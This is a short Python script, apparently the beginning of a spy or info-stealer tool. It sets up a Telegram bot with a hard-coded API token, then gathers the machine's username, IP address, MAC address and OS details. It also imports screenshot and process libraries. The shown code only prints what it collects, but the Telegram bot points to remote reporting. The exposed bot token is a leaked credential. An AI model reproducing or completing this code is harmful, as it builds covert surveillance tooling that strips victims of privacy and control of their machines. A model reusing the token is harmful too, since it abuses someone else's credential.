import telebot
import socket

import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
import pyautogui
#from speedtest import Speedtest
import telebot
import psutil
import platform
#from PIL import Image

bot = telebot.TeleBot("7020392083:AAEa8m5fkYzRE1RzHYWPV30Q6V1TUCH4QfI")  # Подключение бота

name = getpass.getuser()    # Имя пользователя
ip = socket.gethostbyname(socket.getfqdn())   # IP-адрес системы
mac = get_mac()   # MAC адрес
ost = platform.uname()    # Название операционной системы

print(name)
print(ip)
print(mac)
print(ost)

#from speedtest import Speedtest # Импорт модуля. Рассматривался выше
#inet = Speedtest()
#download = float(str(inet.download())[0:2] + "." # Входящая скорость
#                + str(round(inet.download(), 2))[1]) * 0.125
#uploads = float(str(inet.upload())[0:2] + "."   # Исходящая скорость
#                + str(round(inet.download(), 2))[1]) * 0.125
